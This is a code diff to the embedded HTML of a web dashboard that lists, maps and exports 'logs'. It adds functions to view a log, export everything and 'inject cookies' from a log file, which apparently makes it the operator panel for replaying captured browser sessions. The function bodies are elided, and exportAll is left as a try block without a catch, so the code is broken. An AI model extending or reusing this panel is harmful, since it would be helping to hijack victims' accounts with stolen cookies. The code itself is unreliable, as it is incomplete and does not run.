@@ -647,19 +647,38 @@ const GLASS_DASHBOARD_HTML = `<!DOCTYPE html>
         setTimeout(() => { toast.remove(); }, 4000);
     }
 
-    async function refreshLogs() {
-        try {
-            const res = await fetch('/api/logs');
-            const logs = await res.json();
-            allLogs = logs;
-            renderTable(logs);
-            updateStats(logs);
-            updateMap(logs);
-            updateChart(logs);
-        } catch (e) {
-            showToast('Failed to fetch logs: ' + e.message, true);
-        }
+async function refreshLogs() {
+    try {
+        const res = await fetch('/dash/api/logs');
+        const logs = await res.json();
+        allLogs = logs;
+        renderTable(logs);
+        updateStats(logs);
+        updateMap(logs);
+        updateChart(logs);
+    } catch (e) {
+        showToast('Failed to fetch logs: ' + e.message, true);
     }
+}
+
+async function viewLog(filename) {
+    // ...
+    const res = await fetch(`/dash/api/log/${filename}`);
+    // ...
+}
+
+async function injectCookies(filename) {
+    // ...
+    const res = await fetch(`/dash/api/log/${filename}`);
+    // ...
+}
+
+async function exportAll() {
+    try {
+        const res = await fetch('/dash/api/export/all');
+        // ...
+    }
+}
 
     function renderTable(logs) {
         const tbody = document.getElementById('logTable');
